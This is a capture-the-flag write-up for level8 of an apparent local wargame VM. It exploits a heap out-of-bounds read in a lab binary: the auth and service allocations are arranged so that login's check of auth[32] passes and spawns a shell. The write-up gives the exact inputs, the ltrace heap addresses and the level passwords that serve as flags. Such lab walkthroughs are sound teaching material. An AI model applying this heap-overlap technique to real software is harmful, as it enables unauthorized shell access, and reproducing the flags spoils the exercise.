1. Download the binary from the server:
   scp -P 2222 level8@localhost:~/level8 .
   Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

2. Analyze the binary with Ghidra:
   - Command-line interface with 4 commands: auth, reset, service, login
   - auth command: malloc(4) - allocates only 4 bytes on heap
   - service command: strdup(arg) - allocates string on heap
   - login command: checks auth[32] - out-of-bounds read!
   - If auth[32] is non-zero, spawns shell via system("/bin/sh")
   - Global variables: auth at 0x08049aac, service at 0x08049ab0

3. Connect to the VM via SSH:
   ssh level8@localhost -p 2222
   Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

4. Use ltrace to discover heap layout:
   (echo "auth AAAA"; echo "service BBBBBBBBBBBBBBBB"; echo "login") | ltrace ./level8
   
   Key observations:
   malloc(4) = 0x0804a008             ← auth allocated
   malloc(17) = 0x0804a018            ← service allocated (strdup calls malloc)
   
   Distance: 0x0804a018 - 0x0804a008 = 16 bytes
   auth[32] is at: 0x0804a008 + 0x20 = 0x0804a028
   Offset into service: 0x0804a028 - 0x0804a018 = 16 bytes
   
   Conclusion: If service is ≥16 bytes long, auth[32] will read 
   into service buffer and find non-zero data!

5. Execute the exploit:
   ./level8
   
   Enter these commands:
   auth AAAA
   service BBBBBBBBBBBBBBBB
   login
   
   Shell spawned!

6. Get the flag:
   cat /home/user/level9/.pass
   
   Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

7. Exit and login as level9:
   su level9
